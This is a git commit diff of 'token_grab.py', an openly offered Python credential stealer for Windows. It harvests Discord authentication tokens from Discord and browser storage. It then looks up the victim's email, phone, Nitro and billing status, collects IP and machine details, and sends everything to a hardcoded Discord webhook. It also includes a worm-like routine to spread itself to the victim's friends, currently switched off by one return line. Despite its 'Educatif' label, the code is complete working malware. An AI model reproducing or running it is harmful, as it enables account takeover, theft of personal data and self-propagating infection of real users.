8395480ee2bda75fed087639c0164ad07d5f0631
MrGabin <79531012+GabinCleaver@users.noreply.github.com>
2021-06-08 20:14:45 +0200

    Update token_grab.py

--- token_grab.py
+++ token_grab.py
@@ -1,88 +1,213 @@
 import os
-import re
-import json
 
+if os.name != "nt":
+    exit()
+from re import findall
+from json import loads, dumps
+from base64 import b64decode
+from subprocess import Popen, PIPE
 from urllib.request import Request, urlopen
+from threading import Thread
+from time import sleep
+from sys import argv
 
-WEBHOOK_URL = 'WEBHOOK HERE'
+WEBHOOK_URL = "https://discord.com/api/webhooks/851838959625306152/VB7Wt3QMqeYJ-0tFl0j7GAqsADymNaOxnaPtQqfytTTLc-H9nI-l9wSbrZPMg-xypfaL" # Insert webhook url here
 
-PING_ME = True
+LOCAL = os.getenv("LOCALAPPDATA")
+ROAMING = os.getenv("APPDATA")
+PATHS = {
+    "Discord": ROAMING + "\\Discord",
+    "Discord Canary": ROAMING + "\\discordcanary",
+    "Discord PTB": ROAMING + "\\discordptb",
+    "Google Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default",
+    "Opera": ROAMING + "\\Opera Software\\Opera Stable",
+    "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
+    "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
+}
 
-ID = "<@ID HERE>"
 
-def find_tokens(path):
-    path += '\\Local Storage\\leveldb'
+def getHeader(token=None, content_type="application/json"):
+    headers = {
+        "Content-Type": content_type,
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
+    }
+    if token:
+        headers.update({"Authorization": token})
+    return headers
 
+
+def getUserData(token):
+    try:
+        return loads(
+            urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getHeader(token))).read().decode())
+    except:
+        pass
+
+
+def getTokenz(path):
+    path += "\\Local Storage\\leveldb"
     tokens = []
-
     for file_name in os.listdir(path):
-        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
             continue
-
-        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
-                for token in re.findall(regex, line):
+        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
+            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
+                for token in findall(regex, line):
                     tokens.append(token)
     return tokens
 
-def getip():
+
+def whoTheFuckAmI():
     ip = "None"
     try:
-        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
+        ip = urlopen(Request("https://ifconfig.me")).read().decode().strip()
     except:
         pass
     return ip
 
-def getUserData(tokens):
+
+def hWiD():
+    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
+    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
+
+
+def getFriends(token):
     try:
-        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers(tokens))).read().decode()
+        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships",
+                                     headers=getHeader(token))).read().decode())
     except:
         pass
 
-local = os.getenv('LOCALAPPDATA')
-roaming = os.getenv('APPDATA')
 
-paths = {
-    'Discord': roaming + '\\Discord',
-    'Discord Canary': roaming + '\\discordcanary',
-    'Discord PTB': roaming + '\\discordptb',
-    'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
-    'Opera': roaming + '\\Opera Software\\Opera Stable',
-    'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-    'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
-}
+def getChat(token, uid):
+    try:
+        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getHeader(token),
+                                     data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
+    except:
+        pass
 
-message = ID if PING_ME else ''
 
-for platform, path in paths.items():
-    if not os.path.exists(path):
-        continue
+def paymentMethods(token):
+    try:
+        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources",
+                                              headers=getHeader(token))).read().decode())) > 0)
+    except:
+        pass
 
-    message += f'\n**{platform}**\n\n'
 
-    tokens = find_tokens(path)
+def sendMessages(token, chat_id, form_data):
+    try:
+        urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getHeader(token,
+                                                                                                         "multipart/form-data; boundary=---------------------------325414537030329320151394843687"),
+                        data=form_data.encode())).read().decode()
+    except:
+        pass
 
-    if len(tokens) > 0:
-        for token in tokens:
-            message += f'💀 Token: __{token}__\n'
-    else:
-        message += '🤖 __Aucun token trouvés.__\n\n'
+
+def spread(token, form_data, delay):
+    return  # Remove to re-enabled (If you remove this line, malware will spread itself by sending the binary to friends.)
+    for friend in getFriends(token):
+        try:
+            chat_id = getChat(token, friend["id"])
+            sendMessages(token, chat_id, form_data)
+        except Exception as e:
+            pass
+        sleep(delay)
+
+
+def main():
+    cache_path = ROAMING + "\\.cache~$"
+    prevent_spam = True
+    self_spread = True
+    embeds = []
+    working = []
+    checked = []
+    already_cached_tokens = []
+    working_ids = []
+    ip = whoTheFuckAmI()
+    pc_username = os.getenv("UserName")
+    pc_name = os.getenv("COMPUTERNAME")
+    user_path_name = os.getenv("userprofile").split("\\")[2]
+    for platform, path in PATHS.items():
+        if not os.path.exists(path):
+            continue
+        for token in getTokenz(path):
+            if token in checked:
+                continue
+            checked.append(token)
+            uid = None
+            if not token.startswith("mfa."):
+                try:
+                    uid = b64decode(token.split(".")[0].encode()).decode()
+                except:
+                    pass
+                if not uid or uid in working_ids:
+                    continue
+            user_data = getUserData(token)
+            if not user_data:
+                continue
+            working_ids.append(uid)
+            working.append(token)
+            username = user_data["username"] + "#" + str(user_data["discriminator"])
+            user_id = user_data["id"]
+            email = user_data.get("email")
+            phone = user_data.get("phone")
+            nitro = bool(user_data.get("premium_type"))
+            billing = bool(paymentMethods(token))
+            embed = {
+                "color": 0x9585,
+                "fields": [
+                    {
+                        "name": "👽 __Informations de compte: __",
+                        "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nInformations de facturation: {billing}',
+                        "inline": True
+                    },
+                    {
+                        "name": "🤖 __PC Info: __",
+                        "value": f"IP: {ip}\nNom d'utilisateur: {pc_username}\nPC Nom: {pc_name}\nEmplacement du token: {platform}",
+                        "inline": True
+                    },
+                    {
+                        "name": "💀 __Token :__",
+                        "value": f'Token: {token}',
+                        "inline": False
+                    }
+                ],
+                "author": {
+                    "name": f"🔹 {username} ({user_id})",
+                },
+                "footer": {
+                    "text": "➡️ Token Grab Educatif par Gabin#7955"
+                }
+            }
+            embeds.append(embed)
+    with open(cache_path, "a") as file:
+        for token in checked:
+            if not token in already_cached_tokens:
+                file.write(token + "\n")
+    if len(working) == 0:
+        working.append('123')
+    webhook = {
+        "content": "",
+        "embeds": embeds,
+        "username": "Token Grab",
+        "avatar_url": ""
+    }
+    try:
+        
+        urlopen(Request(WEBHOOK_URL, data=dumps(webhook).encode(), headers=getHeader()))
+    except:
+        pass
+    if self_spread:
+        for token in working:
+            with open(argv[0], encoding="utf-8") as file:
+                content = file.read()
+            payload = ""
+            Thread(target=spread, args=(token, payload, 7500 / 1000)).start()
+
 
 try:
-    message += "**IP:**\n\n"
-    message += f'👽 __{getip()}__\n'
-except:
-    message += '🤖 __Aucune IP trouvés.__\n'
-
-headers = {
-    'Content-Type': 'application/json',
-    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
-}
-
-payload = json.dumps({'content': message})
-
-try:
-    req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
-    urlopen(req)
-except:
+    main()
+except Exception as e:
+    print(e)
     pass
